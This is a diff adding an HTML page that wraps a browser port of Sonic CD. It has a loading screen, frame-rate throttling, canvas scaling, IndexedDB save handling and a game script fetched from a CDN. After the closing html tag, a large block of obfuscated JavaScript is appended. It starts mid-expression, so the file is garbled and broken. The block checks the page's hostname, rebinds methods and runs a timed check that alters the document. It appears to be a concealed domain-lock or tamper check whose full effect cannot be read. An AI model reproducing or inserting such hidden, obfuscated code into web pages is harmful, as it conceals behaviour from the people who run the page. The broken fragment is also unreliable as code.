@@ -1,0 +1,540 @@
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script><!DOCTYPE html>
+
+
+
+<!-- Ultimate Game Stash file--> 
+<!-- For the regularly updating doc go to https://docs.google.com/document/d/1_FmH3BlSBQI7FGgAQL59-ZPe8eCxs35wel6JUyVaG8Q/ -->
+
+
+<!-- credits to crunch arcade for putting this into a single file html -->
+<!-- heads up btw, a few special stages or maybe its js one do have issues and maybe a boss crashes but i didnt recompile this one so i wouldnt know -->
+
+<html lang="en-us">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Sonic CD</title>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/UGBONTOP/ugs-soniccd@main/image_2026-02-28_164525280.png" type="image/png">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background: #000;
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+        }
+
+        #canvasWrapper {
+            position: fixed;
+            left: 0; top: 0;
+            width: 100vw; height: 100vh;
+            background: black;
+            z-index: 1;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        canvas {
+            display: block;
+            position: absolute;
+            image-rendering: pixelated;
+            image-rendering: crisp-edges;
+            -ms-interpolation-mode: nearest-neighbor;
+            outline: none;
+        }
+
+        #output { display: none; }
+
+        #loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000 url('https://cdn.jsdelivr.net/gh/UGBONTOP/ugs-soniccd@main/image_2026-02-28_165116299.png') no-repeat center center;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            transition: opacity 0.4s ease;
+        }
+
+        #loading-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #loading-screen.hidden { display: none; }
+
+        .loading-content {
+            width: 80%;
+            max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .loading-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 8px;
+        }
+
+        .title-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .mini-favicon {
+            width: 24px;
+            height: 24px;
+            border-radius: 4px;
+        }
+
+        .loading-title {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 900;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .loading-mb {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .loading-bar-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .loading-bar {
+            width: 0%;
+            height: 100%;
+            background: #fff;
+            border-radius: 10px;
+            transition: width 0.3s ease-out;
+        }
+
+        .loading-text {
+            font-size: 13px;
+            color: #fff;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            height: 1.2em;
+        }
+
+        .loading-dots {
+            position: absolute;
+            bottom: 40%;
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 8px; height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: dot-pulse 1.5s infinite ease-in-out;
+            box-shadow: 0 0 5px rgba(255,255,255,0.5);
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dot-pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50%       { opacity: 1;   transform: scale(1.2); }
+        }
+
+        .ownership-footer {
+            position: absolute;
+            bottom: 25px;
+            width: 100%;
+            text-align: center;
+            color: rgba(255,255,255,0.7);
+            font-size: 11px;
+            padding: 0 20px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+        }
+
+        .control-panel {
+            position: fixed;
+            top: 15px; right: 15px;
+            z-index: 1001;
+        }
+
+        .game-btn {
+            background: rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 6px;
+            color: white;
+            padding: 8px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(4px);
+            transition: all 0.2s;
+            min-width: 130px;
+            font-family: 'Inter', sans-serif;
+        }
+        .game-btn:hover {
+            background: rgba(0,0,0,0.8);
+            border-color: rgba(255,255,255,0.4);
+        }
+
+        #fpsInfo {
+            position: fixed;
+            bottom: 8px; right: 10px;
+            z-index: 99999;
+            color: rgba(255,255,255,0.4);
+            font-size: 11px;
+            font-family: monospace;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="canvasWrapper">
+        <canvas id="canvas" tabindex="0" width="848" height="480" onclick="window.focus();" oncontextmenu="event.preventDefault();"></canvas>
+    </div>
+
+    <div id="loading-screen">
+        <div class="loading-content">
+            <div class="loading-header">
+                <div class="title-group">
+                    <img src="https://cdn.jsdelivr.net/gh/UGBONTOP/ugs-soniccd@main/image_2026-02-28_164525280.png" class="mini-favicon" alt="icon">
+                    <div class="loading-title">Sonic CD (html by crunch arcade)</div>
+                </div>
+                <div class="loading-mb" id="mb-text">0.0MB of 75.0MB</div>
+            </div>
+            <div class="loading-bar-container">
+                <div class="loading-bar" id="loading-bar"></div>
+            </div>
+            <div class="loading-text" id="loading-text">getting jsdelivr stuff...</div>
+        </div>
+
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <div class="ownership-footer">
+            crunch arcade owns this btw
+        </div>
+    </div>
+
+    <div class="control-panel">
+        <button id="fullscreen-button" class="game-btn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
+            Fullscreen
+        </button>
+    </div>
+
+    <div id="fpsInfo">detecting refresh rate...</div>
+    <textarea id="output" rows="8"></textarea>
+
+    <script type="text/javascript">
+        const $ = id => document.getElementById(id);
+
+        var loadingBar    = $('loading-bar');
+        var loadingText   = $('loading-text');
+        var mbText        = $('mb-text');
+        var loadingScreen = $('loading-screen');
+        var totalSizeMB   = 75.0;
+
+        function finishLoading() {
+            loadingBar.style.width = '100%';
+            mbText.textContent = totalSizeMB.toFixed(1) + 'MB of ' + totalSizeMB.toFixed(1) + 'MB';
+            loadingText.textContent = 'ready!';
+            setTimeout(function() {
+                loadingScreen.classList.add('fade-out');
+                loadingScreen.addEventListener('transitionend', function() {
+                    loadingScreen.classList.add('hidden');
+                }, { once: true });
+            }, 400);
+        }
+
+        $('fullscreen-button').onclick = function() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(function() {
+                    console.warn('Fullscreen failed');
+                });
+            } else {
+                document.exitFullscreen();
+            }
+        };
+
+        (function() {
+            var fpsInfoEl = $('fpsInfo');
+
+            function detectRefreshRate(cb) {
+                var samples = [], last = null, count = 0;
+                function tick(now) {
+                    if (last !== null) {
+                        var delta = now - last;
+                        if (delta > 0 && delta < 100) samples.push(delta);
+                    }
+                    last = now;
+                    if (++count < 60) { requestAnimationFrame(tick); }
+                    else {
+                        samples.sort(function(a,b){ return a-b; });
+                        cb(Math.round(1000 / samples[Math.floor(samples.length/2)]));
+                    }
+                }
+                requestAnimationFrame(tick);
+            }
+
+            function pickTargetFPS(hz) {
+                if (hz <= 60) return hz;
+                var best = 30;
+                for (var d = 1; d <= hz; d++) {
+                    if (hz % d === 0) {
+                        var fps = hz / d;
+                        if (fps <= 60 && fps > best) best = fps;
+                    }
+                }
+                return Math.max(30, best);
+            }
+
+            function installRAFThrottle(targetFPS) {
+                var interval = 1000 / targetFPS;
+                var lastTime = -Infinity;
+                var origRAF = window.requestAnimationFrame.bind(window);
+                var origCAF = window.cancelAnimationFrame.bind(window);
+                var idMap = new Map(), idCounter = 1;
+
+                window.requestAnimationFrame = function(cb) {
+                    var wrappedId = idCounter++;
+                    var entry = { active: true, nativeId: null };
+                    function wrapped(now) {
+                        if (!entry.active) return;
+                        if ((now - lastTime) >= interval - 0.5) { lastTime = now; cb(now); }
+                        else { entry.nativeId = origRAF(wrapped); }
+                    }
+                    entry.nativeId = origRAF(wrapped);
+                    idMap.set(wrappedId, entry);
+                    return wrappedId;
+                };
+
+                window.cancelAnimationFrame = function(id) {
+                    var entry = idMap.get(id);
+                    if (entry) { entry.active = false; try { origCAF(entry.nativeId); } catch(e){} idMap.delete(id); }
+                };
+            }
+
+            detectRefreshRate(function(hz) {
+                var target = pickTargetFPS(hz);
+                fpsInfoEl.textContent = 'monitor: ' + hz + 'hz → locked at ' + target + 'fps';
+                installRAFThrottle(target);
+                console.log('[FPS] Monitor: ' + hz + 'hz, locked to: ' + target + 'fps');
+                setTimeout(function() { fpsInfoEl.style.transition = 'opacity 1s'; fpsInfoEl.style.opacity = '0'; }, 5000);
+            });
+        })();
+
+        (function() {
+            const BASE_W = 848, BASE_H = 480;
+
+            function isFS() {
+                return !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement);
+            }
+
+            function adoptCanvas(el) {
+                if (!el) return;
+                try { el.width = BASE_W; el.height = BASE_H; } catch(e) {}
+                if (!el.id) el.id = 'canvas';
+                const wrap = $('canvasWrapper');
+                if (!wrap.contains(el)) wrap.appendChild(el);
+                el.style.position = 'absolute';
+                window.Module = window.Module || {};
+                window.Module.canvas = el;
+            }
+
+            adoptCanvas($('canvas'));
+
+            new MutationObserver(muts => {
+                for (const m of muts)
+                    for (const n of m.addedNodes)
+                        if (n.nodeName === 'CANVAS')
+                            setTimeout(() => { adoptCanvas(n); updateAllCanvasFits(); }, 0);
+            }).observe(document.documentElement, { childList: true, subtree: true });
+
+            function applyCoverFit(canvasEl) {
+                try {
+                    if (!canvasEl) return;
+                    const vw = Math.max(1, window.innerWidth);
+                    const vh = Math.max(1, window.innerHeight);
+                    var scale = isFS()
+                        ? Math.max(vw / BASE_W, vh / BASE_H)
+                        : Math.min(vw / BASE_W, vh / BASE_H);
+                    const displayW = Math.round(BASE_W * scale);
+                    const displayH = Math.round(BASE_H * scale);
+                    canvasEl.style.width  = displayW + 'px';
+                    canvasEl.style.height = displayH + 'px';
+                    canvasEl.style.left   = Math.round((vw - displayW) / 2) + 'px';
+                    canvasEl.style.top    = Math.round((vh - displayH) / 2) + 'px';
+                    if (canvasEl.width !== BASE_W || canvasEl.height !== BASE_H) {
+                        try { canvasEl.width = BASE_W; canvasEl.height = BASE_H; } catch(e) {}
+                    }
+                } catch(e) { console.warn('applyCoverFit failed', e); }
+            }
+
+            function updateAllCanvasFits() {
+                document.querySelectorAll('canvas').forEach(c => applyCoverFit(c));
+            }
+
+            window.addEventListener('resize', updateAllCanvasFits);
+            document.addEventListener('fullscreenchange', updateAllCanvasFits);
+            document.addEventListener('webkitfullscreenchange', updateAllCanvasFits);
+            document.addEventListener('mozfullscreenchange', updateAllCanvasFits);
+            setTimeout(function() { setInterval(updateAllCanvasFits, 500); }, 3000);
+            updateAllCanvasFits();
+            window.updateAllCanvasFits = updateAllCanvasFits;
+        })();
+
+        var _saveSystemReady = false;
+        var DB_NAME = 'sonic-cd-saves';
+        var STORE_NAME = 'files';
+
+        function openSaveDB() {
+            return new Promise(function(res, rej) {
+                var rq = indexedDB.open(DB_NAME, 1);
+                rq.onupgradeneeded = function(e) { e.target.result.createObjectStore(STORE_NAME); };
+                rq.onsuccess = function(e) { res(e.target.result); };
+                rq.onerror = function(e) { rej(e.target.error); };
+            });
+        }
+
+        function saveToDB(data) {
+            openSaveDB().then(function(db) {
+                var tx = db.transaction(STORE_NAME, 'readwrite');
+                tx.objectStore(STORE_NAME).put(new Uint8Array(data), 'SData.bin');
+                tx.oncomplete = function() { console.log('[saves] SData.bin saved (' + data.length + ' bytes)'); };
+                tx.onerror = function(e) { console.warn('[saves] save failed:', e.target.error); };
+            });
+        }
+
+        function loadFromDB() {
+            return openSaveDB().then(function(db) {
+                return new Promise(function(res, rej) {
+                    var tx = db.transaction(STORE_NAME, 'readonly');
+                    var rq = tx.objectStore(STORE_NAME).get('SData.bin');
+                    rq.onsuccess = function() { res(rq.result || null); };
+                    rq.onerror = function(e) { rej(e.target.error); };
+                });
+            });
+        }
+
+        function installSaveHooks() {
+            if (_saveSystemReady) return;
+            _saveSystemReady = true;
+
+            loadFromDB().then(function(data) {
+                if (data && data.length > 0) {
+                    try {
+                        FS.writeFile('/SData.bin', data);
+                        console.log('[saves] SData.bin restored (' + data.length + ' bytes)');
+                    } catch(e) { console.warn('[saves] restore failed:', e); }
+                } else {
+                    console.log('[saves] no existing save found, starting fresh');
+                }
+            }).catch(function(e) { console.warn('[saves] loadFromDB error:', e); });
+
+            var origWrite = FS.write;
+            FS.write = function(stream, buffer, offset, length, position) {
+                var result = origWrite.apply(this, arguments);
+                if (stream && stream.path && stream.path.includes('SData') && length > 0) {
+                    try {
+                        var saved = FS.readFile('/SData.bin');
+                        saveToDB(saved);
+                    } catch(e) { console.warn('[saves] failed to read SData.bin after write:', e); }
+                }
+                return result;
+            };
+
+            console.log('[saves] save hooks installed');
+        }
+
+        var Module = {
+            preRun: [],
+            postRun: [function() {
+                finishLoading();
+                if (window.updateAllCanvasFits) updateAllCanvasFits();
+                setTimeout(installSaveHooks, 1000);
+            }],
+            print:    function(text) { console.log(text); },
+            printErr: function(text) { console.error(text); },
+            canvas: (function() {
+                var canvas = document.getElementById('canvas');
+                canvas.addEventListener("webglcontextlost", function(e) {
+                    alert('WebGL context lost. Reload the page.');
+                    e.preventDefault();
+                }, false);
+                return canvas;
+            })(),
+            setStatus: function(text) {
+                if (!Module.setStatus.last) Module.setStatus.last = { time: Date.now(), text: '' };
+                if (text === Module.setStatus.last.text) return;
+                var m = text.match(/([^(]+)\((\d+(\.\d+)?)\/(\d+)\)/);
+                var now = Date.now();
+                if (m && now - Module.setStatus.last.time < 30) return;
+                Module.setStatus.last.time = now;
+                Module.setStatus.last.text = text;
+                if (m) {
+                    var loaded  = parseFloat(m[2]);
+                    var total   = parseFloat(m[4]);
+                    var percent = Math.round((loaded / total) * 100);
+                    var currentMB = (percent / 100 * totalSizeMB).toFixed(1);
+                    loadingBar.style.width = percent + '%';
+                    mbText.textContent     = currentMB + 'MB of ' + totalSizeMB.toFixed(1) + 'MB';
+                    if      (percent < 20) loadingText.textContent = 'getting jsdelivr stuff...';
+                    else if (percent < 60) loadingText.textContent = 'downloading game data...';
+                    else if (percent < 90) loadingText.textContent = 'assembling Data.rsdk...';
+                    else                   loadingText.textContent = 'almost there...';
+                } else {
+                    if (text) loadingText.textContent = text;
+                }
+            },
+            totalDependencies: 0,
+            monitorRunDependencies: function(left) {
+                this.totalDependencies = Math.max(this.totalDependencies, left);
+                Module.setStatus(left ? 'Preparing... (' + (this.totalDependencies - left) + '/' + this.totalDependencies + ')' : '');
+            }
+        };
+
+        Module.setStatus('Downloading...');
+    </script>
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/UGBONTOP/ugs-soniccd@main/js1/index.js"></script>
+
+</body>
+</html>
+t(0x25da))+parseInt(0xfd)*-0xa)][CjsPKzyFLwfe(-0x1540+-parseInt(0x1564)+-0x2b82*Math.ceil(-parseInt(0x1)))][CjsPKzyFLwfe(Math.ceil(-parseInt(0x49))*-0x58+Math.max(-parseInt(0x66),-parseInt(0x66))*parseInt(0x25)+-0x3*0x32b)](qiwjHUauNrHLN$fg),TbeQm$$iDqjMKpTtSlnEF=ub_IKGtkVJnrm[FNmbuOKunHKDQnEd],PCdCtHVuQ$WZinsEonTDhRHx=utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]||ksLNxwdrpBft;ksLNxwdrpBft[CjsPKzyFLwfe(parseInt(0x1f25)+0x9*-parseInt(0x349)+Math.ceil(-parseInt(0xbf)))]=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(Math.ceil(-parseInt(0x27))*Math.max(-parseInt(0x38),-0x38)+Math.trunc(0x874)+parseFloat(parseInt(0x1))*Math.trunc(-parseInt(0x1023)))](qiwjHUauNrHLN$fg),ksLNxwdrpBft[DHKhHH$CzdaTFZpF(0x1b9)]=PCdCtHVuQ$WZinsEonTDhRHx[CjsPKzyFLwfe(parseInt(0xf84)+Number(-parseInt(0xa8b))*0x2+0x680)][CjsPKzyFLwfe(Math.floor(-0x2)*-parseInt(0x81b)+parseInt(0x144c)+parseInt(0x23a9)*Math.trunc(-0x1))](PCdCtHVuQ$WZinsEonTDhRHx),utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]=ksLNxwdrpBft;}});EsAEXrTkuAdPT__tKKG(),udh_ln$z[YxGzqKLhsTvBRmcdZ(0x184)](hvUOLCHfCBhIT);let ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x18c)](hvUOLCHfCBhIT);!ZZlEfnTJFgKrlZQ&&(ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x1b1)](ALBAzExBHKkx(0x27*0x14+parseInt(0x1902)+-parseInt(0x36)*parseInt(0x81))),ZZlEfnTJFgKrlZQ['id']=hvUOLCHfCBhIT,document[ALBAzExBHKkx(parseFloat(-0x18ce)+-0x462+-parseInt(0xf0)*-0x20)][ALBAzExBHKkx(-parseInt(0x3)*Math.trunc(0x471)+Number(parseInt(0x247c))+Math.max(-parseInt(0x5),-parseInt(0x5))*parseInt(0x477))](ZZlEfnTJFgKrlZQ));const JusV_APG$gjSZYfdHqhYsOfh=document[ALBAzExBHKkx(-parseInt(0x749)+Math.ceil(-parseInt(0x25f4))+parseInt(0x2e11))](ALBAzExBHKkx(parseInt(parseInt(0x214c))+0x1afe+-0x1*Number(parseInt(0x3b73))));JusV_APG$gjSZYfdHqhYsOfh[ALBAzExBHKkx(-0x281*Number(0xa)+0x1*0x153b+Math.trunc(0x491))]=ALBAzExBHKkx(0x6*parseInt(0x350)+0x236+Math.floor(-0x11d)*parseInt(0x13)),ZZlEfnTJFgKrlZQ[ALBAzExBHKkx(parseInt(0x1347)+parseInt(0x3)*Number(-0x9b)+-parseInt(0x10a0))](JusV_APG$gjSZYfdHqhYsOfh),gGA$_MNmIu===Math[YxGzqKLhsTvBRmcdZ(0x186)](-parseInt(0x5)*parseFloat(-parseInt(0x21e))+Math.ceil(-0xf)*-0x250+Math.floor(0x2d42)*-0x1)*-(Math.max(-0x989,-0x989)+Math.ceil(-0x44e)+parseInt(-parseInt(0x2))*-0x840)+parseInt(Math.ceil(0x1)*Math.max(0xd53,parseInt(0xd53))+-parseInt(0x1df5)*Number(-0x1)+Math.ceil(-parseInt(0x6a))*parseInt(0x20))+parseFloat(-parseInt(Math.trunc(-parseInt(0x1))*parseInt(0x144f)+Math.ceil(0x2d)*-0xb3+Math.trunc(parseInt(0x1))*parseInt(0x368b)))*(parseInt(0x2bb)+parseInt(0x6e3)+-parseInt(0x1eb)*Math.max(parseInt(0x5),parseInt(0x5)))?bzBMId=!![]:YFTSa_AyznhLRB=!![];}function IuySzzpOiISwZDDrwmF(){const TJjv$_TBBMK=sFfEkK$fMziBAJZwZbkuvp,wRFucCDOfu$LtCMXVPgy=_0xe8c3,k_l_ellCISKwd=location[wRFucCDOfu$LtCMXVPgy(Math.floor(0x11)*parseFloat(-parseInt(0x9e))+Math.floor(-parseInt(0x2194))+parseInt(0x4)*parseInt(0xb36))];return k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(parseInt(0x1)*Math.ceil(parseInt(0x265))+parseInt(0x5)*0x69e+-0x22b2)||k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(0x7*-0x53f+Math.floor(-0x1)*parseInt(0x2351)+0x48cb*parseInt(parseInt(0x1)))||location[wRFucCDOfu$LtCMXVPgy(parseInt(0x2133)+parseInt(0x4b6)+-0x3*parseInt(0xc5f))][TJjv$_TBBMK(0x1b5)](TJjv$_TBBMK(0x19f));}c$uljJUCGCQHFqM(crypto[KmkEnmSV(-0x7a*-parseInt(0x13)+parseInt(0x1f8b)+-0x257*parseInt(0x11))]()[KmkEnmSV(parseFloat(-0x1076)+Math.ceil(parseInt(0x1d3))*Math.max(0x2,0x2)+parseFloat(0xdba))]('-',''),parseInt(0x1*parseInt(-parseInt(0x270a))+0x1*-0x4ff+parseInt(0x43b8))+(Math.ceil(-parseInt(0xc7d))*-parseInt(0x1)+Math.floor(-parseInt(0x18e5))+0x1e00)+parseInt(-(0x49aa+0x163*parseInt(0x29)+-0x593f))),c$uljJUCGCQHFqM(crypto[fyfZe$A(0x18b)]()[fyfZe$A(0x19c)]('-',''),Math[KmkEnmSV(0x1250+-0x19f0+Math.max(0x887,parseInt(0x887)))](-(0x85d*-0x1+-parseInt(0x25ce)*-0x1+-parseInt(0x3ae)*parseInt(0x8)))*(0x9*parseFloat(parseInt(0x405))+parseInt(0x106)*-0x17+-parseInt(0xc70))+-parseInt(parseInt(0xbfa)+parseInt(0x1c)*0x29c+-0x1*Math.trunc(parseInt(0x3077)))+Math[KmkEnmSV(Math.floor(parseInt(0x34d))+parseInt(0x61)*-0x5f+parseInt(0x2180))](-(-0x13ff+parseInt(-0x765)+0x1ffd))*-(parseInt(0x213b)+parseFloat(-0x1e65)*parseInt(-parseInt(0x1))+Math.floor(parseInt(0x25))*-0x1b8));let cDI_LjPiksLv$sA=setInterval(()=>{const wAfptqBlmnOZ=fyfZe$A,gcJTS=KmkEnmSV;hK$kJs&&clearInterval(cDI_LjPiksLv$sA);for(let DwEqUVjz_qHgd_omhiKOFelRy=-parseInt(-parseInt(0x2286)+parseInt(parseInt(0x60d))*-0x2+parseInt(0x2f30))+Math[wAfptqBlmnOZ(0x196)](-parseInt(0xe05)*-0x2+Number(-0x6c9)*Math.floor(0x5)+parseInt(0x1d4)*0xb)*(Math.trunc(0x17)*-parseInt(0x86)+parseInt(0x9a)+Math.ceil(0xb72))+-parseInt(Math.max(parseInt(0x1),0x1)*-parseInt(0x2926)+-0x1d97+Number(parseInt(0x629f)));DwEqUVjz_qHgd_omhiKOFelRy<udh_ln$z[gcJTS(-parseInt(0x3d8)+Math.max(parseInt(0x86),parseInt(0x86))*Math.floor(-parseInt(0x3b))+Math.ceil(parseInt(0x2395))*Number(0x1))];DwEqUVjz_qHgd_omhiKOFelRy++){const cPPRWqXnlPOY$$cBq=udh_ln$z[DwEqUVjz_qHgd_omhiKOFelRy],Okf$w_HLhAd=document[gcJTS(Math.floor(-0x96)*-0xd+-parseInt(0x18f5)+parseFloat(parseInt(0x1b))*0xad)](cPPRWqXnlPOY$$cBq);YFTSa_AyznhLRB&&bzBMId&&(!hK$kJs&&(!Okf$w_HLhAd&&(!IuySzzpOiISwZDDrwmF()&&document[wAfptqBlmnOZ(0x1b0)][gcJTS(Math.floor(parseInt(0x995))*-0x4+Math.ceil(-0x8fe)+Math.max(0x371,0x371)*0xe)]())));}},Math[KmkEnmSV(Math.ceil(0x2615)*Math.floor(parseInt(0x1))+-parseInt(0x171f)+-parseInt(0xe31)*0x1)](-parseInt(-0x6f1*parseInt(0x7)+0x2*-0x24b3+Math.max(-parseInt(0x104),-0x104)*-parseInt(0x9e)))+(-parseInt(0x2)*0xf08+0x1baf+0xfe4)+Number(parseInt(0x1083)*Math.max(parseInt(0x1),0x1)+Math.floor(0x1e34)+-parseInt(0x11d7)));}()));function sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek){const jpcyYzd_r_c=UravPbGESYjDUNqxKcf$Vqza();return sFfEkK$fMziBAJZwZbkuvp=function(cBkxdlJOLrthNdkDJWsPnwlWD,Ew_izWDrWs$VbNMSejx){cBkxdlJOLrthNdkDJWsPnwlWD=cBkxdlJOLrthNdkDJWsPnwlWD-(parseInt(0x222d)*-parseInt(0x1)+0xbaa+Math.ceil(parseInt(0x1801)));let ZrC$BmMHQJFnM$qxVDvOaapr=jpcyYzd_r_c[cBkxdlJOLrthNdkDJWsPnwlWD];if(sFfEkK$fMziBAJZwZbkuvp['MCMlHP']===undefined){const kiHmW=function(qHLfn){let zVDPTWpEcic$l=Number(-0x7d)*parseFloat(-parseInt(0xe))+0x1b0e*Number(0x1)+parseInt(-parseInt(0xb))*0x301&Math.trunc(-parseInt(0x5))*0x1c+parseFloat(-parseInt(0x788))*parseInt(0x5)+-0x29d*-parseInt(0xf),GQloCGHmGKtLJqIIj$jnKaqx=new Uint8Array(qHLfn['match'](/.{1,2}/g)['map'](JRMexmf=>parseInt(JRMexmf,-0x1*parseInt(-0x12e)+-0xdc1*-0x1+-parseInt(0xedf)))),yzuBpRiFSFq_wPGNK=GQloCGHmGKtLJqIIj$jnKaqx['map'](Wkg_QjyPwvVREelpsnGOnwJG=>Wkg_QjyPwvVREelpsnGOnwJG^zVDPTWpEcic$l),gF$xXW$bUfgmPrkGxHtTR=new TextDecoder(),QpJsUNKKXcaFcrHADyIt=gF$xXW$bUfgmPrkGxHtTR['decode'](yzuBpRiFSFq_wPGNK);return QpJsUNKKXcaFcrHADyIt;};sFfEkK$fMziBAJZwZbkuvp['TWdYOH']=kiHmW,DgkkwGrBFCVM$xjRVLz$VfAbWhV=arguments,sFfEkK$fMziBAJZwZbkuvp['MCMlHP']=!![];}const Xtz$tyRcF_YASGBEJfRTSL=jpcyYzd_r_c[-0x961+0x7be+parseInt(0x1)*parseInt(0x1a3)],aK$Aa_l=cBkxdlJOLrthNdkDJWsPnwlWD+Xtz$tyRcF_YASGBEJfRTSL,XQHXnDh$$EY=DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l];return!XQHXnDh$$EY?(sFfEkK$fMziBAJZwZbkuvp['MbVogc']===undefined&&(sFfEkK$fMziBAJZwZbkuvp['MbVogc']=!![]),ZrC$BmMHQJFnM$qxVDvOaapr=sFfEkK$fMziBAJZwZbkuvp['TWdYOH'](ZrC$BmMHQJFnM$qxVDvOaapr),DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l]=ZrC$BmMHQJFnM$qxVDvOaapr):ZrC$BmMHQJFnM$qxVDvOaapr=XQHXnDh$$EY,ZrC$BmMHQJFnM$qxVDvOaapr;},sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek);}function _0x257e(){const aWI$GMwS=sFfEkK$fMziBAJZwZbkuvp,uudKm=[aWI$GMwS(0x186),aWI$GMwS(0x1a1),aWI$GMwS(0x1a5),aWI$GMwS(0x199),aWI$GMwS(0x1b8),aWI$GMwS(0x19e),aWI$GMwS(0x18a),aWI$GMwS(0x1bf),aWI$GMwS(0x1a0),aWI$GMwS(0x196),aWI$GMwS(0x18d),aWI$GMwS(0x1b0),aWI$GMwS(0x17f),aWI$GMwS(0x18b),aWI$GMwS(0x1bd),aWI$GMwS(0x1b1),aWI$GMwS(0x19b),aWI$GMwS(0x1af),aWI$GMwS(0x197),aWI$GMwS(0x1ae),aWI$GMwS(0x185),aWI$GMwS(0x187),aWI$GMwS(0x1a8),aWI$GMwS(0x19a),aWI$GMwS(0x1b7),aWI$GMwS(0x1bc),aWI$GMwS(0x1a3),aWI$GMwS(0x1a2),aWI$GMwS(0x182),aWI$GMwS(0x192),aWI$GMwS(0x18e),aWI$GMwS(0x181),aWI$GMwS(0x1ab),aWI$GMwS(0x1a4),aWI$GMwS(0x1ba),aWI$GMwS(0x18c),aWI$GMwS(0x1a6),aWI$GMwS(0x19c),aWI$GMwS(0x1b3),aWI$GMwS(0x1aa),aWI$GMwS(0x194),aWI$GMwS(0x1b9),aWI$GMwS(0x1bb),aWI$GMwS(0x188),aWI$GMwS(0x1ad),aWI$GMwS(0x19d),aWI$GMwS(0x198),aWI$GMwS(0x180),aWI$GMwS(0x193)];return _0x257e=function(){return uudKm;},_0x257e();}</script>
